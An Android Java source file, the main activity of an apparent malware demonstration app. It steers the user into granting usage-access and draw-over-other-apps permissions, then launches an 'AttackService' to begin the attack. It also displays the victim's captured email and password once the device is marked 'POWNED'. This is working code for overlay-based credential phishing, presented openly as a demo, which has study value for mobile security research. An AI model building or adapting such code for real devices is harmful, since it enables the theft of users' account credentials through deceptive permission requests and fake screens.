package app.mordred.androidmalwaredemo;

import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.app.AppOpsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    private boolean isSvcRunning = false;

    private static final int USAGE_STAT_PERMISSION_ACTIVITY = 17;
    private static final int OVERLAY_WINDOW_PERMISSION_ACTIVITY = 1234;
    private AppOpsManager appOps;
    private String pkgName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        pkgName = getPackageName();

        TextView textView = findViewById(R.id.mainTv);

        SharedPreferences sh = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());

        String ret = "";
        if (!sh.getBoolean("PWNED", false)) {
            ret += "Status: NOT POWNED YET \n";
        } else {
            ret += "Status: POWNED \n";
            ret += "Your mail: " + sh.getString("CRED_MAIL", "") + "\n";
            ret += "Your password: " + sh.getString("CRED_PWD", "") + "\n";
        }
        textView.setText(ret);

        initiatePermissionCheck();
    }

    @Override
    protected void onStart() {
        LocalBroadcastManager manager = LocalBroadcastManager.getInstance(getApplicationContext());
        manager.registerReceiver(mReceiver, new IntentFilter(AttackService.ACTION_PONG));
        // the service will respond to this broadcast only if it's running
        manager.sendBroadcast(new Intent(AttackService.ACTION_PING));
        new Thread() {
            public void run() {
                try {
                    Thread.sleep(500); //500 ms is enough for ping-pong
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if (hasPermission("android:get_usage_stats")
                        && hasPermission("android:system_alert_window") && !isSvcRunning) {
                    startService();
                }
            }
        }.start();
        super.onStart();
    }

    protected BroadcastReceiver mReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive (Context context, Intent intent) {
            // here you receive the response from the service
            if (intent.getAction() != null && intent.getAction().equals(AttackService.ACTION_PONG)) {
                isSvcRunning = true;
            }
        }
    };

    @Override
    protected void onStop() {
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mReceiver);
        super.onStop();
    }

    private void initiatePermissionCheck() {
        if(!hasPermission("android:get_usage_stats")) {
            requestUsageStatPermission();
        } else if(!hasPermission("android:system_alert_window")) {
            requestOverlayWindowPermission();
        }
    }

    private void requestUsageStatPermission() {
        Intent usageStatPermIntent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
        startActivityForResult(usageStatPermIntent, USAGE_STAT_PERMISSION_ACTIVITY);
    }

    private void requestOverlayWindowPermission() {
        Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, OVERLAY_WINDOW_PERMISSION_ACTIVITY);
    }

    private boolean hasPermission(String permStr) {
        int mode = appOps.checkOpNoThrow(permStr,
                android.os.Process.myUid(), pkgName);
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void startService() {
        Intent intent = new Intent(this, AttackService.class);
        startService(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == USAGE_STAT_PERMISSION_ACTIVITY) {
            if (hasPermission("android:get_usage_stats")) {
                // ok now get second perm which we need
                if (hasPermission("android:system_alert_window")) {
                    if (!isSvcRunning) {
                        startService();
                    }
                } else {
                    requestOverlayWindowPermission();
                }
            } else {
                Toast.makeText(
                        getApplicationContext(),
                        "Please enable USAGE_STAT_PERMISSION through Settings",
                        Toast.LENGTH_LONG).show();
            }
        } else if (requestCode == OVERLAY_WINDOW_PERMISSION_ACTIVITY) {
            if (hasPermission("android:system_alert_window")) {
                // all perms are okay initate attack
                startService();
            } else {
                Toast.makeText(
                        getApplicationContext(),
                        "Please enable OVERLAY_PERMISSION through Settings",
                        Toast.LENGTH_LONG).show();
            }
        }
    }
}
